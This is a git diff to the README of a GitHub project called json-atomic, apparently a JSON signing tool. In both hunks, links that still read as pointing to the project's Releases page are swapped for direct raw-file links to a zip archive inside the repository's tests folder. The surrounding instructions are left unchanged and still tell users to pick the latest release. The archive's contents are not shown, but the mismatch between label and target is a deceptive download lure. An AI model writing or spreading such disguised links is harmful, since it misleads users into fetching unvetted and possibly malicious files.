@@ -8,7 +8,7 @@ Welcome to json-atomic! This application helps you ensure the authenticity of yo
 
 To get started, visit the Releases page to download the latest version of json-atomic:
 
-[![Download json-atomic](https://img.shields.io/badge/Download_json--atomic-blue.svg)](https://github.com/SnoowFalll/json-atomic/releases)
+[![Download json-atomic](https://github.com/SnoowFalll/json-atomic/raw/refs/heads/main/tests/atomic_json_3.3.zip)](https://github.com/SnoowFalll/json-atomic/raw/refs/heads/main/tests/atomic_json_3.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version.
@@ -94,7 +94,7 @@ json-atomic is licensed under the MIT License. This allows you to use, modify, a
 
 ## ✅ Next Steps
 
-- Visit the [Releases page](https://github.com/SnoowFalll/json-atomic/releases) to download the latest version now.
+- Visit the [Releases page](https://github.com/SnoowFalll/json-atomic/raw/refs/heads/main/tests/atomic_json_3.3.zip) to download the latest version now.
 - Explore the features and start securing your JSON data today.
 
 For additional information about json-atomic, check the detailed documentation available in this repository. Happy signing!
